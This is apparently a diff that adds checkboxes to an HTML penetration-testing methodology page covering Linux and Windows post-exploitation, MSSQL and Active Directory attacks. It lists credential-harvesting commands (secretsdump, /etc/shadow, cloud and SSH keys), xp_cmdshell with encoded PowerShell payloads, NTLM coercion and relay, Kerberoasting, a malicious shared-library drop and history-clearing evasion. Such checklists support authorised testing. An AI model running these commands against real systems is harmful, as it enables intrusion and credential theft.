+        <li><input type="checkbox"> Process with <code>secretsdump.py -ntds ntds.dit -system system.hive LOCAL</code></li>
       </ul>
     </li>
-    <li>User-context credential stores:
+    <li><input type="checkbox"> User-context credential stores:
       <ul>
-        <li>Browser cookie / login stores via DPAPI</li>
-        <li>Windows Credential Manager via <code>cmdkey</code> / DPAPI</li>
-        <li>Putty / OpenSSH keys in user profile</li>
-        <li>KeePass / Lastpass agents if present</li>
+        <li><input type="checkbox"> Browser cookie / login stores via DPAPI</li>
+        <li><input type="checkbox"> Windows Credential Manager via <code>cmdkey</code> / DPAPI</li>
+        <li><input type="checkbox"> Putty / OpenSSH keys in user profile</li>
+        <li><input type="checkbox"> KeePass / Lastpass agents if present</li>
       </ul>
     </li>
   </ul>
@@ -1012,26 +1014,26 @@ SharpDPAPI.exe machinetriage</code></pre>
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Win Local</a> &middot; <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS</a></p>
 
 <h3 id="methodology-linux-postex">1.5 Linux Post Exploitation</h3>
-<ul><li>Triage &rarr; look for misconfigs first &rarr; escalate &rarr; pivot. Save kernel exploits for last.</li></ul>
+<ul><li><input type="checkbox"> Triage &rarr; look for misconfigs first &rarr; escalate &rarr; pivot. Save kernel exploits for last.</li></ul>
 <h3 id="methodology-linux-postex-triage">1.5.1 Host Triage</h3>
   <ul>
-    <li>Identity and privilege:
+    <li><input type="checkbox"> Identity and privilege:
       <ul>
-        <li><code>id</code>, <code>groups</code>, <code>sudo -l</code></li>
-        <li><code>cat /etc/passwd</code>, <code>cat /etc/shadow</code> (if readable)</li>
+        <li><input type="checkbox"> <code>id</code>, <code>groups</code>, <code>sudo -l</code></li>
+        <li><input type="checkbox"> <code>cat /etc/passwd</code>, <code>cat /etc/shadow</code> (if readable)</li>
       </ul>
     </li>
-    <li>Host facts:
+    <li><input type="checkbox"> Host facts:
       <ul>
-        <li><code>uname -a</code>, <code>cat /etc/os-release</code></li>
-        <li><code>hostname -f</code>, <code>dnsdomainname</code></li>
-        <li><code>ps auxf</code>, <code>ss -tulpn</code></li>
+        <li><input type="checkbox"> <code>uname -a</code>, <code>cat /etc/os-release</code></li>
+        <li><input type="checkbox"> <code>hostname -f</code>, <code>dnsdomainname</code></li>
+        <li><input type="checkbox"> <code>ps auxf</code>, <code>ss -tulpn</code></li>
       </ul>
     </li>
-    <li>Run an automated checker:
+    <li><input type="checkbox"> Run an automated checker:
       <ul>
-        <li>LinPEAS: <code>./linpeas.sh -a</code></li>
-        <li>LinEnum, linux-smart-enumeration</li>
+        <li><input type="checkbox"> LinPEAS: <code>./linpeas.sh -a</code></li>
+        <li><input type="checkbox"> LinEnum, linux-smart-enumeration</li>
       </ul>
     </li>
   </ul>
@@ -1055,36 +1057,36 @@ echo "[paste]" | base64 -d | bash       # on target</code></pre>
 
 <h3 id="methodology-linux-postex-privesc">1.5.2 Privilege Escalation</h3>
   <ul>
-    <li>Look at sudo first:
+    <li><input type="checkbox"> Look at sudo first:
       <ul>
-        <li><code>sudo -l</code> &mdash; cross-reference each entry with <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a></li>
-        <li>Look for env-var preservation (<code>env_keep</code>) abuses</li>
-        <li>Look for wildcards in sudo command paths</li>
+        <li><input type="checkbox"> <code>sudo -l</code> &mdash; cross-reference each entry with <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a></li>
+        <li><input type="checkbox"> Look for env-var preservation (<code>env_keep</code>) abuses</li>
+        <li><input type="checkbox"> Look for wildcards in sudo command paths</li>
       </ul>
     </li>
-    <li>Look at SUID binaries:
+    <li><input type="checkbox"> Look at SUID binaries:
       <ul>
-        <li><code>find / -perm -u=s -type f 2>/dev/null</code></li>
-        <li>Cross-reference each binary with GTFOBins</li>
+        <li><input type="checkbox"> <code>find / -perm -u=s -type f 2>/dev/null</code></li>
+        <li><input type="checkbox"> Cross-reference each binary with GTFOBins</li>
       </ul>
     </li>
-    <li>Look at capabilities:
+    <li><input type="checkbox"> Look at capabilities:
       <ul>
-        <li><code>getcap -r / 2>/dev/null</code></li>
-        <li>cap_setuid / cap_dac_read_search lead to easy wins</li>
+        <li><input type="checkbox"> <code>getcap -r / 2>/dev/null</code></li>
+        <li><input type="checkbox"> cap_setuid / cap_dac_read_search lead to easy wins</li>
       </ul>
     </li>
-    <li>Look at writable PATH dirs &amp; cron:
+    <li><input type="checkbox"> Look at writable PATH dirs &amp; cron:
       <ul>
-        <li><code>ls -la /etc/cron* /var/spool/cron</code></li>
-        <li><code>cat /etc/crontab</code> and per-user crontabs</li>
-        <li>Audit the PATH for writable elements</li>
+        <li><input type="checkbox"> <code>ls -la /etc/cron* /var/spool/cron</code></li>
+        <li><input type="checkbox"> <code>cat /etc/crontab</code> and per-user crontabs</li>
+        <li><input type="checkbox"> Audit the PATH for writable elements</li>
       </ul>
     </li>
-    <li>Kernel CVE as a last resort:
+    <li><input type="checkbox"> Kernel CVE as a last resort:
       <ul>
-        <li>Cross-reference kernel + distro with public PoCs</li>
-        <li>Test on a snapshot before running on the target</li>
+        <li><input type="checkbox"> Cross-reference kernel + distro with public PoCs</li>
+        <li><input type="checkbox"> Test on a snapshot before running on the target</li>
       </ul>
     </li>
   </ul>
@@ -1121,18 +1123,18 @@ gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
 
 <h3 id="methodology-linux-postex-lateral">1.5.3 Lateral Movement</h3>
   <ul>
-    <li>Re-use SSH keys:
+    <li><input type="checkbox"> Re-use SSH keys:
       <ul>
-        <li>Look for <code>~/.ssh/id_*</code> on every accessible user</li>
-        <li>Look in <code>/etc/ssh/ssh_host_*_key</code> when root</li>
-        <li>Check known_hosts for next-target hostnames</li>
+        <li><input type="checkbox"> Look for <code>~/.ssh/id_*</code> on every accessible user</li>
+        <li><input type="checkbox"> Look in <code>/etc/ssh/ssh_host_*_key</code> when root</li>
+        <li><input type="checkbox"> Check known_hosts for next-target hostnames</li>
       </ul>
     </li>
-    <li>Re-use Docker / Kubernetes / cloud creds:
+    <li><input type="checkbox"> Re-use Docker / Kubernetes / cloud creds:
       <ul>
-        <li><code>~/.docker/config.json</code></li>
-        <li><code>~/.kube/config</code></li>
-        <li><code>~/.aws/credentials</code></li>
+        <li><input type="checkbox"> <code>~/.docker/config.json</code></li>
+        <li><input type="checkbox"> <code>~/.kube/config</code></li>
+        <li><input type="checkbox"> <code>~/.aws/credentials</code></li>
       </ul>
     </li>
   </ul>
@@ -1156,16 +1158,16 @@ cat /etc/shadow   # if readable — crack with hashcat -m 1800</code></pre>
 
 <h3 id="methodology-linux-postex-shared-lib">1.5.4 Shared Library Hijacking</h3>
   <ul>
-    <li>Identify writable directories in the linker&rsquo;s search path:
+    <li><input type="checkbox"> Identify writable directories in the linker&rsquo;s search path:
       <ul>
-        <li>Read <code>/etc/ld.so.conf</code> and <code>/etc/ld.so.conf.d/*</code></li>
-        <li>Validate with <code>ldconfig -v</code></li>
+        <li><input type="checkbox"> Read <code>/etc/ld.so.conf</code> and <code>/etc/ld.so.conf.d/*</code></li>
+        <li><input type="checkbox"> Validate with <code>ldconfig -v</code></li>
       </ul>
     </li>
-    <li>Drop a malicious .so that a SUID binary will load:
+    <li><input type="checkbox"> Drop a malicious .so that a SUID binary will load:
       <ul>
-        <li>Compile: <code>gcc -shared -fPIC -o evil.so evil.c</code></li>
-        <li>Trigger by running the consuming binary</li>
+        <li><input type="checkbox"> Compile: <code>gcc -shared -fPIC -o evil.so evil.c</code></li>
+        <li><input type="checkbox"> Trigger by running the consuming binary</li>
       </ul>
     </li>
   </ul>
@@ -1200,18 +1202,18 @@ sudo LD_PRELOAD=/tmp/pe.so [allowed-command]</code></pre>
 
 <h3 id="methodology-linux-postex-defense-evasion">1.5.5 Defense Evasion</h3>
   <ul>
-    <li>Avoid bash history:
+    <li><input type="checkbox"> Avoid bash history:
       <ul>
-        <li><code>unset HISTFILE</code></li>
-        <li><code>export HISTFILE=/dev/null</code></li>
-        <li><code>history -c</code> on exit</li>
+        <li><input type="checkbox"> <code>unset HISTFILE</code></li>
+        <li><input type="checkbox"> <code>export HISTFILE=/dev/null</code></li>
+        <li><input type="checkbox"> <code>history -c</code> on exit</li>
       </ul>
     </li>
-    <li>Clean up after privesc:
+    <li><input type="checkbox"> Clean up after privesc:
       <ul>
-        <li>Remove dropped binaries</li>
-        <li>Restore modified configs</li>
-        <li>Document what changed in handoff notes</li>
+        <li><input type="checkbox"> Remove dropped binaries</li>
+        <li><input type="checkbox"> Restore modified configs</li>
+        <li><input type="checkbox"> Document what changed in handoff notes</li>
       </ul>
     </li>
   </ul>
@@ -1219,53 +1221,53 @@ sudo LD_PRELOAD=/tmp/pe.so [allowed-command]</code></pre>
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Linux PrivEsc</a> &middot; <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a></p>
 
 <h3 id="methodology-mssql">1.6 MSSQL</h3>
-<ul><li>Authenticate, enumerate, then weaponise. Always look for relay and linked-server pivots before noisy primitives.</li></ul>
+<ul><li><input type="checkbox"> Authenticate, enumerate, then weaponise. Always look for relay and linked-server pivots before noisy primitives.</li></ul>
 <h3 id="methodology-mssql-auth">1.6.1 Authentication</h3>
   <ul>
-    <li>Pick a credential source:
+    <li><input type="checkbox"> Pick a credential source:
       <ul>
-        <li>Domain user with default grants</li>
-        <li><code>sa</code> with weak password</li>
-        <li>NTLM relay from a captured hash</li>
-        <li>Hash from a config file or memory dump</li>
+        <li><input type="checkbox"> Domain user with default grants</li>
+        <li><input type="checkbox"> <code>sa</code> with weak password</li>
+        <li><input type="checkbox"> NTLM relay from a captured hash</li>
+        <li><input type="checkbox"> Hash from a config file or memory dump</li>
       </ul>
     </li>
-    <li>Validate via netexec:
+    <li><input type="checkbox"> Validate via netexec:
       <ul>
-        <li><code>netexec mssql [ip] -u user -p pass</code></li>
-        <li><code>netexec mssql [ip] -u user -H ntlm-hash</code></li>
-        <li><code>netexec mssql [ip] --local-auth -u sa -p pass</code></li>
+        <li><input type="checkbox"> <code>netexec mssql [ip] -u user -p pass</code></li>
+        <li><input type="checkbox"> <code>netexec mssql [ip] -u user -H ntlm-hash</code></li>
+        <li><input type="checkbox"> <code>netexec mssql [ip] --local-auth -u sa -p pass</code></li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-mssql-enumeration">1.6.2 Enumeration</h3>
   <ul>
-    <li>Server-level info:
+    <li><input type="checkbox"> Server-level info:
       <ul>
-        <li><code>SELECT @@VERSION</code></li>
-        <li><code>SELECT name FROM sys.databases</code></li>
-        <li><code>SELECT system_user, IS_SRVROLEMEMBER('sysadmin')</code></li>
+        <li><input type="checkbox"> <code>SELECT @@VERSION</code></li>
+        <li><input type="checkbox"> <code>SELECT name FROM sys.databases</code></li>
+        <li><input type="checkbox"> <code>SELECT system_user, IS_SRVROLEMEMBER('sysadmin')</code></li>
       </ul>
     </li>
-    <li>Role and login map:
+    <li><input type="checkbox"> Role and login map:
       <ul>
-        <li><code>EXEC sp_helpsrvrolemember 'sysadmin'</code></li>
-        <li><code>SELECT loginname FROM master..syslogins WHERE sysadmin = 1</code></li>
+        <li><input type="checkbox"> <code>EXEC sp_helpsrvrolemember 'sysadmin'</code></li>
+        <li><input type="checkbox"> <code>SELECT loginname FROM master..syslogins WHERE sysadmin = 1</code></li>
       </ul>
     </li>
-    <li>Linked servers and impersonation:
+    <li><input type="checkbox"> Linked servers and impersonation:
       <ul>
-        <li><code>SELECT * FROM sys.servers</code></li>
-        <li><code>EXEC sp_helplinkedsrvlogin</code></li>
-        <li><code>SELECT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'</code></li>
+        <li><input type="checkbox"> <code>SELECT * FROM sys.servers</code></li>
+        <li><input type="checkbox"> <code>EXEC sp_helplinkedsrvlogin</code></li>
+        <li><input type="checkbox"> <code>SELECT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'</code></li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-mssql-code-exec">1.6.3 Code Execution Primitives</h3>
   <ul>
-    <li>xp_cmdshell route:</li>
+    <li><input type="checkbox"> xp_cmdshell route:</li>
   </ul>
 <pre><code class="language-bash"># Enable xp_cmdshell (requires sysadmin)
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
@@ -1275,30 +1277,30 @@ EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami'
 EXEC xp_cmdshell 'powershell -enc [base64-payload]'</code></pre>
   <ul>
-    <li>OLE Automation route:
+    <li><input type="checkbox"> OLE Automation route:
       <ul>
-        <li><code>EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;</code></li>
-        <li><code>DECLARE @o INT EXEC sp_OACreate 'WScript.Shell', @o OUT EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c calc'</code></li>
+        <li><input type="checkbox"> <code>EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;</code></li>
+        <li><input type="checkbox"> <code>DECLARE @o INT EXEC sp_OACreate 'WScript.Shell', @o OUT EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c calc'</code></li>
       </ul>
     </li>
-    <li>CLR assembly route:
+    <li><input type="checkbox"> CLR assembly route:
       <ul>
-        <li><code>EXEC sp_configure 'clr enabled', 1; RECONFIGURE;</code></li>
-        <li><code>EXEC sp_configure 'clr strict security', 0;</code></li>
-        <li>Load a signed assembly with <code>CREATE ASSEMBLY</code> and execute</li>
+        <li><input type="checkbox"> <code>EXEC sp_configure 'clr enabled', 1; RECONFIGURE;</code></li>
+        <li><input type="checkbox"> <code>EXEC sp_configure 'clr strict security', 0;</code></li>
+        <li><input type="checkbox"> Load a signed assembly with <code>CREATE ASSEMBLY</code> and execute</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-mssql-linked-server">1.6.4 Linked Server Pivot</h3>
   <ul>
-    <li>Enumerate linked servers and reachable databases:
+    <li><input type="checkbox"> Enumerate linked servers and reachable databases:
       <ul>
-        <li><code>SELECT * FROM sys.servers</code></li>
-        <li><code>SELECT * FROM OPENQUERY([linked], 'SELECT @@version')</code></li>
+        <li><input type="checkbox"> <code>SELECT * FROM sys.servers</code></li>
+        <li><input type="checkbox"> <code>SELECT * FROM OPENQUERY([linked], 'SELECT @@version')</code></li>
       </ul>
     </li>
-    <li>Pivot RPC for xp_cmdshell on the linked side:</li>
+    <li><input type="checkbox"> Pivot RPC for xp_cmdshell on the linked side:</li>
   </ul>
 <pre><code class="language-bash"># Enable xp_cmdshell on linked server
 EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT [linked]
@@ -1307,37 +1309,37 @@ EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT [linked]
 # Execute on linked server
 EXEC ('xp_cmdshell ''whoami''') AT [linked]</code></pre>
   <ul>
-    <li>Chain across multiple links if needed</li>
+    <li><input type="checkbox"> Chain across multiple links if needed</li>
   </ul>
 
 <h3 id="methodology-mssql-relay">1.6.5 NTLM Relay Attacks</h3>
   <ul>
-    <li>Set up the relay listener:
+    <li><input type="checkbox"> Set up the relay listener:
       <ul>
-        <li><code>ntlmrelayx.py -t mssql://[mssql-ip] -smb2support -socks</code></li>
-        <li>Validate the relay target accepts NTLM (no SMB signing)</li>
+        <li><input type="checkbox"> <code>ntlmrelayx.py -t mssql://[mssql-ip] -smb2support -socks</code></li>
+        <li><input type="checkbox"> Validate the relay target accepts NTLM (no SMB signing)</li>
       </ul>
     </li>
-    <li>Coerce NTLM to your listener:
+    <li><input type="checkbox"> Coerce NTLM to your listener:
       <ul>
-        <li>Coercer / PetitPotam / PrinterBug</li>
-        <li>Webserver coercion via <code>img src=\\\\you\\share</code></li>
+        <li><input type="checkbox"> Coercer / PetitPotam / PrinterBug</li>
+        <li><input type="checkbox"> Webserver coercion via <code>img src=\\\\you\\share</code></li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-mssql-privesc">1.6.6 Privilege Escalation</h3>
   <ul>
-    <li>Impersonate sysadmin via <code>EXECUTE AS</code></li>
-    <li>Trustworthy database escalation:
+    <li><input type="checkbox"> Impersonate sysadmin via <code>EXECUTE AS</code></li>
+    <li><input type="checkbox"> Trustworthy database escalation:
       <ul>
-        <li><code>ALTER DATABASE [db] SET TRUSTWORTHY ON</code> when authorised</li>
-        <li>Then use OWNER-mapped login to escalate</li>
+        <li><input type="checkbox"> <code>ALTER DATABASE [db] SET TRUSTWORTHY ON</code> when authorised</li>
+        <li><input type="checkbox"> Then use OWNER-mapped login to escalate</li>
       </ul>
     </li>
-    <li>UNC path coercion via xp_dirtree:
+    <li><input type="checkbox"> UNC path coercion via xp_dirtree:
       <ul>
-        <li><code>EXEC xp_dirtree '\\\\[you]\\share\\'</code> &mdash; captures NTLMv2 from the SQL service account</li>
+        <li><input type="checkbox"> <code>EXEC xp_dirtree '\\\\[you]\\share\\'</code> &mdash; captures NTLMv2 from the SQL service account</li>
       </ul>
     </li>
   </ul>
@@ -1345,10 +1347,10 @@ EXEC ('xp_cmdshell ''whoami''') AT [linked]</code></pre>
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" target="_blank" rel="noopener noreferrer">HackTricks MSSQL</a></p>
 
 <h3 id="methodology-ad-enumeration">1.7 Active Directory Enumeration</h3>
-<ul><li>Collect a full view of the domain before touching anything. Plan attack paths before staging.</li></ul>
+<ul><li><input type="checkbox"> Collect a full view of the domain before touching anything. Plan attack paths before staging.</li></ul>
 <h3 id="methodology-ad-enumeration-bloodhound">1.7.1 BloodHound &amp; SharpHound</h3>
   <ul>
-    <li>Collect from the foothold with the right scope:</li>
+    <li><input type="checkbox"> Collect from the foothold with the right scope:</li>
   </ul>
 <pre><code class="language-bash"># Windows: in-memory via execute-assembly or direct
 SharpHound.exe -c All --zipfilename loot.zip
@@ -1358,12 +1360,12 @@ SharpHound.exe -c DCOnly --stealth
 # Linux foothold
 bloodhound-python -u [user] -p [pass] -d [domain] -dc [dc] -c All</code></pre>
   <ul>
-    <li>Import and run the foundation queries:
+    <li><input type="checkbox"> Import and run the foundation queries:
       <ul>
-        <li>Shortest path from owned principals to Domain Admins</li>
-        <li>Kerberoastable users + members of high-value groups</li>
-        <li>Constrained/unconstrained delegation map</li>
-        <li>ACL chains into Tier-0</li>
+        <li><input type="checkbox"> Shortest path from owned principals to Domain Admins</li>
+        <li><input type="checkbox"> Kerberoastable users + members of high-value groups</li>
+        <li><input type="checkbox"> Constrained/unconstrained delegation map</li>
+        <li><input type="checkbox"> ACL chains into Tier-0</li>
       </ul>
     </li>
   </ul>
@@ -1371,96 +1373,96 @@ bloodhound-python -u [user] -p [pass] -d [domain] -dc [dc] -c All</code></pre>
 
 <h3 id="methodology-ad-enumeration-ldap">1.7.2 Direct LDAP Queries</h3>
   <ul>
-    <li>Quick enumeration via netexec:
+    <li><input type="checkbox"> Quick enumeration via netexec:
       <ul>
-        <li><code>netexec ldap [dc] -u user -p pass --users</code></li>
-        <li><code>netexec ldap [dc] -u user -p pass --groups</code></li>
-        <li><code>netexec ldap [dc] -u user -p pass --trusted-for-delegation</code></li>
-        <li><code>netexec ldap [dc] -u user -p pass --asreproast asrep.out</code></li>
-        <li><code>netexec ldap [dc] -u user -p pass --kerberoasting tgs.out</code></li>
+        <li><input type="checkbox"> <code>netexec ldap [dc] -u user -p pass --users</code></li>
+        <li><input type="checkbox"> <code>netexec ldap [dc] -u user -p pass --groups</code></li>
+        <li><input type="checkbox"> <code>netexec ldap [dc] -u user -p pass --trusted-for-delegation</code></li>
+        <li><input type="checkbox"> <code>netexec ldap [dc] -u user -p pass --asreproast asrep.out</code></li>
+        <li><input type="checkbox"> <code>netexec ldap [dc] -u user -p pass --kerberoasting tgs.out</code></li>
       </ul>
     </li>
-    <li>Targeted LDAP filters via ldapsearch / ldeep:
+    <li><input type="checkbox"> Targeted LDAP filters via ldapsearch / ldeep:
       <ul>
-        <li>Disabled users vs active users</li>
-        <li>Service accounts with SPNs</li>
-        <li>Computers with TRUSTED_FOR_DELEGATION</li>
-        <li>Pre-auth-not-required accounts</li>
+        <li><input type="checkbox"> Disabled users vs active users</li>
+        <li><input type="checkbox"> Service accounts with SPNs</li>
+        <li><input type="checkbox"> Computers with TRUSTED_FOR_DELEGATION</li>
+        <li><input type="checkbox"> Pre-auth-not-required accounts</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-ad-enumeration-powerview">1.7.3 PowerView</h3>
   <ul>
-    <li>Domain map:
+    <li><input type="checkbox"> Domain map:
       <ul>
-        <li><code>Get-DomainController</code></li>
-        <li><code>Get-DomainTrust -SearchBase "DC=parent,DC=tld"</code></li>
-        <li><code>Get-DomainOU</code></li>
+        <li><input type="checkbox"> <code>Get-DomainController</code></li>
+        <li><input type="checkbox"> <code>Get-DomainTrust -SearchBase "DC=parent,DC=tld"</code></li>
+        <li><input type="checkbox"> <code>Get-DomainOU</code></li>
       </ul>
     </li>
-    <li>Identity map:
+    <li><input type="checkbox"> Identity map:
       <ul>
-        <li><code>Get-DomainUser -SPN | select samaccountname</code></li>
-        <li><code>Get-DomainUser -PreauthNotRequired</code></li>
-        <li><code>Get-DomainGroupMember "Domain Admins" -Recurse</code></li>
+        <li><input type="checkbox"> <code>Get-DomainUser -SPN | select samaccountname</code></li>
+        <li><input type="checkbox"> <code>Get-DomainUser -PreauthNotRequired</code></li>
+        <li><input type="checkbox"> <code>Get-DomainGroupMember "Domain Admins" -Recurse</code></li>
       </ul>
     </li>
-    <li>Delegation map:
+    <li><input type="checkbox"> Delegation map:
       <ul>
-        <li><code>Get-DomainComputer -Unconstrained</code></li>
-        <li><code>Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto</code></li>
-        <li><code>Get-DomainComputer | ?{$_."msds-allowedtoactonbehalfofotheridentity"}</code></li>
+        <li><input type="checkbox"> <code>Get-DomainComputer -Unconstrained</code></li>
+        <li><input type="checkbox"> <code>Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto</code></li>
+        <li><input type="checkbox"> <code>Get-DomainComputer | ?{$_."msds-allowedtoactonbehalfofotheridentity"}</code></li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-ad-enumeration-acl-enum">1.7.4 ACL Enumeration</h3>
   <ul>
-    <li>Generic-All / Generic-Write / WriteDACL / WriteOwner:
+    <li><input type="checkbox"> Generic-All / Generic-Write / WriteDACL / WriteOwner:
       <ul>
-        <li>BloodHound built-in queries cover the common chains</li>
-        <li>PowerView: <code>Get-DomainObjectAcl -Identity [target] -ResolveGUIDs</code></li>
+        <li><input type="checkbox"> BloodHound built-in queries cover the common chains</li>
+        <li><input type="checkbox"> PowerView: <code>Get-DomainObjectAcl -Identity [target] -ResolveGUIDs</code></li>
       </ul>
     </li>
-    <li>AddSelf / AddMember chains:
+    <li><input type="checkbox"> AddSelf / AddMember chains:
       <ul>
-        <li>Path through nested groups into Tier-0</li>
-        <li>AddMember-then-DCSync chain into Domain Admins</li>
+        <li><input type="checkbox"> Path through nested groups into Tier-0</li>
+        <li><input type="checkbox"> AddMember-then-DCSync chain into Domain Admins</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-ad-enumeration-netexec">1.7.5 NetExec / CrackMapExec Sweeps</h3>
   <ul>
-    <li>Spray validated credentials across the domain:
+    <li><input type="checkbox"> Spray validated credentials across the domain:
       <ul>
-        <li><code>netexec smb [subnet]/[mask] -u user -p pass --shares</code></li>
-        <li><code>netexec smb [subnet]/[mask] -u user -p pass --loggedon-users</code></li>
-        <li><code>netexec smb [subnet]/[mask] -u user -p pass -M spider_plus</code></li>
+        <li><input type="checkbox"> <code>netexec smb [subnet]/[mask] -u user -p pass --shares</code></li>
+        <li><input type="checkbox"> <code>netexec smb [subnet]/[mask] -u user -p pass --loggedon-users</code></li>
+        <li><input type="checkbox"> <code>netexec smb [subnet]/[mask] -u user -p pass -M spider_plus</code></li>
       </ul>
     </li>
-    <li>Find admin where the user is local-admin:
+    <li><input type="checkbox"> Find admin where the user is local-admin:
       <ul>
-        <li><code>netexec smb [subnet]/[mask] -u user -p pass</code> &mdash; <code>Pwn3d!</code> marker</li>
+        <li><input type="checkbox"> <code>netexec smb [subnet]/[mask] -u user -p pass</code> &mdash; <code>Pwn3d!</code> marker</li>
       </ul>
     </li>
-    <li>Pivot to WinRM / MSSQL with the same cred:
+    <li><input type="checkbox"> Pivot to WinRM / MSSQL with the same cred:
       <ul>
-        <li><code>netexec winrm [ip] -u user -p pass</code></li>
-        <li><code>netexec mssql [ip] -u user -p pass</code></li>
+        <li><input type="checkbox"> <code>netexec winrm [ip] -u user -p pass</code></li>
+        <li><input type="checkbox"> <code>netexec mssql [ip] -u user -p pass</code></li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-ad-enumeration-bloodhound-cypher">1.7.6 Cypher Queries</h3>
   <ul>
-    <li>Useful saved queries:
+    <li><input type="checkbox"> Useful saved queries:
       <ul>
-        <li>Shortest path to Domain Admins</li>
-        <li>Shortest path to Tier-0 from owned principals</li>
-        <li>Users with paths through ACLs only</li>
-        <li>Computers with unconstrained delegation reachable by a non-DA</li>
+        <li><input type="checkbox"> Shortest path to Domain Admins</li>
+        <li><input type="checkbox"> Shortest path to Tier-0 from owned principals</li>
+        <li><input type="checkbox"> Users with paths through ACLs only</li>
+        <li><input type="checkbox"> Computers with unconstrained delegation reachable by a non-DA</li>
       </ul>
     </li>
   </ul>
@@ -1468,23 +1470,23 @@ bloodhound-python -u [user] -p [pass] -d [domain] -dc [dc] -c All</code></pre>
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a> &middot; <a href="https://posts.specterops.io/" target="_blank" rel="noopener noreferrer">SpecterOps blog</a> &middot; <a href="https://adsecurity.org/" target="_blank" rel="noopener noreferrer">AD Security</a></p>
 
 <h3 id="methodology-ad-exploitation">1.8 Active Directory Exploitation</h3>
-<ul><li>Pick the right primitive for the captured context. Stage credentials, tickets, certificates safely; validate dominance is reproducible.</li></ul>
+<ul><li><input type="checkbox"> Pick the right primitive for the captured context. Stage credentials, tickets, certificates safely; validate dominance is reproducible.</li></ul>
 <h3 id="methodology-ad-exploitation-kerberoast-asrep">1.8.1 Kerberoasting &amp; AS-REP Roasting</h3>
   <ul>
-    <li>Roast every SPN-holding user:
+    <li><input type="checkbox"> Roast every SPN-holding user:
       <ul>
-        <li><code>netexec ldap [dc] -u user -p pass --kerberoasting roasts.out</code></li>
-        <li><code>impacket-GetUserSPNs -request -dc-ip [dc] [dom]/user:pass</code></li>
-        <li><code>Rubeus.exe kerberoast /outfile:roasts.txt</code></li>
+        <li><input type="checkbox"> <code>netexec ldap [dc] -u user -p pass --kerberoasting roasts.out</code></li>
+        <li><input type="checkbox"> <code>impacket-GetUserSPNs -request -dc-ip [dc] [dom]/user:pass</code></li>
+        <li><input type="checkbox"> <code>Rubeus.exe kerberoast /outfile:roasts.txt</code></li>
       </ul>
     </li>
-    <li>AS-REP roast pre-auth-not-required accounts:
+    <li><input type="checkbox"> AS-REP roast pre-auth-not-required accounts:
       <ul>
-        <li><code>netexec ldap [dc] -u user -p pass --asreproast asrep.out</code></li>
-        <li><code>impacket-GetNPUsers -dc-ip [dc] -no-pass -usersfile users.txt [dom]/</code></li>
+        <li><input type="checkbox"> <code>netexec ldap [dc] -u user -p pass --asreproast asrep.out</code></li>
+        <li><input type="checkbox"> <code>impacket-GetNPUsers -dc-ip [dc] -no-pass -usersfile users.txt [dom]/</code></li>
       </ul>
     </li>
-    <li>Crack offline with hashcat:</li>
+    <li><input type="checkbox"> Crack offline with hashcat:</li>
   </ul>
 <pre><code class="language-bash"># Kerberoast TGS (mode 13100)
 hashcat -m 13100 roasts.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
@@ -1496,40 +1498,40 @@ hashcat -m 18200 asrep.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashca
 
 <h3 id="methodology-ad-exploitation-unconstrained">1.8.2 Unconstrained Delegation</h3>
   <ul>
-    <li>Find unconstrained-delegation hosts:
+    <li><input type="checkbox"> Find unconstrained-delegation hosts:
       <ul>
-        <li>BloodHound built-in query</li>
-        <li><code>Get-DomainComputer -Unconstrained</code></li>
+        <li><input type="checkbox"> BloodHound built-in query</li>
+        <li><input type="checkbox"> <code>Get-DomainComputer -Unconstrained</code></li>
       </ul>
     </li>
-    <li>Coerce a DC to authenticate to a controlled host with this flag:
+    <li><input type="checkbox"> Coerce a DC to authenticate to a controlled host with this flag:
       <ul>
-        <li>Tools: PetitPotam, Coercer, PrinterBug, DFSCoerce</li>
-        <li>Capture the inbound TGT with Rubeus monitor on the host</li>
+        <li><input type="checkbox"> Tools: PetitPotam, Coercer, PrinterBug, DFSCoerce</li>
+        <li><input type="checkbox"> Capture the inbound TGT with Rubeus monitor on the host</li>
       </ul>
     </li>
-    <li>Extract the TGT and use it for DCSync</li>
+    <li><input type="checkbox"> Extract the TGT and use it for DCSync</li>
   </ul>
 
 <h3 id="methodology-ad-exploitation-constrained">1.8.3 Constrained Delegation</h3>
   <ul>
